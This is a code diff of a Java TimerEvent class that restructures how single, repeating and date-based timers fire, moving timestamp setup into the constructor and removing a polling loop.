@@ -31,6 +31,9 @@ public class TimerEvent extends Event {
 
     public TimerEvent(int actionId, byte[] confParams) {
         super(Event.EVENT_TIMER, actionId, confParams);
+
+        setEvery(1000);
+        timestamp = new Date();
     }
 
     public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
@@ -46,78 +49,71 @@ public class TimerEvent extends Event {
         // #ifdef DBC
         Check.requires(statusObj != null, "StatusObj NULL");
         // #endif
-        timestamp = new Date();
+
         Date now;
         long wait;
 
-        for (;;) {
-            switch (this.type) {
-            case Conf.CONF_TIMER_SINGLE:
+        switch (this.type) {
+        case Conf.CONF_TIMER_SINGLE:
 
-                wait = loDelay;
-                now = new Date();
+            wait = loDelay;
+            now = new Date();
 
-                if (now.getTime() - timestamp.getTime() > wait) {
-                    // #debug
-                    debug.trace("TIMER_SINGLE");
-                    trigger();
-                    //#debug
-                    debug.trace("stopping timer single");
-                    stop();
-                    return;
-                }
-
-                break;
-            case Conf.CONF_TIMER_REPEAT:
-                wait = loDelay;
-                now = new Date();
-
-                if (now.getTime() - timestamp.getTime() > wait) {
-                    // #debug
-                    debug.trace("TIMER_REPEAT");
-                    timestamp = now;
-                    trigger();
-                }
-                break;
-            case Conf.CONF_TIMER_DATE:
-
-                long tmpTime = hiDelay << 32;
-                tmpTime += loDelay;
-
-                Date tmpDate = new Date(tmpTime);
+            if (now.getTime() - timestamp.getTime() > wait) {
                 // #debug
-                debug.trace(tmpDate.toString());
-
-                now = new Date();
-
-                if (now.getTime() > tmpTime) {
-                    // #debug
-                    debug.trace("TIMER_DATE");
-                    trigger();
-                    //#debug
-                    debug.trace("stopping timer date");
-                    stop();
-                    return;
-                }
-
-                break;
-            case Conf.CONF_TIMER_DELTA:
-                // TODO: da implementare
-                // #debug
-                debug.trace("TIMER_DELTA");
-                break;
-            default:
-                // #debug
-                debug.error("shouldn't be here");
-                break;
-            }
-
-            if (smartSleep(SLEEP_TIME)) {
-                // #debug
-                debug.trace("EventSleep exit");
+                debug.trace("TIMER_SINGLE");
+                trigger();
+                //#debug
+                debug.trace("stopping timer single");
+                stop();
                 return;
             }
+
+            break;
+        case Conf.CONF_TIMER_REPEAT:
+            wait = loDelay;
+            now = new Date();
+
+            if (now.getTime() - timestamp.getTime() > wait) {
+                // #debug
+                debug.trace("TIMER_REPEAT");
+                timestamp = now;
+                trigger();
+            }
+            break;
+        case Conf.CONF_TIMER_DATE:
+
+            long tmpTime = hiDelay << 32;
+            tmpTime += loDelay;
+
+            Date tmpDate = new Date(tmpTime);
+            // #debug
+            debug.trace(tmpDate.toString());
+
+            now = new Date();
+
+            if (now.getTime() > tmpTime) {
+                // #debug
+                debug.trace("TIMER_DATE");
+                trigger();
+                //#debug
+                debug.trace("stopping timer date");
+                stop();
+                return;
+            }
+
+            break;
+        case Conf.CONF_TIMER_DELTA:
+            // TODO: da implementare
+            // #debug
+            debug.trace("TIMER_DELTA");
+            break;
+        default:
+            // #debug
+            debug.error("shouldn't be here");
+            break;
         }
+
     }
 
     protected boolean parse(byte[] confParams) {
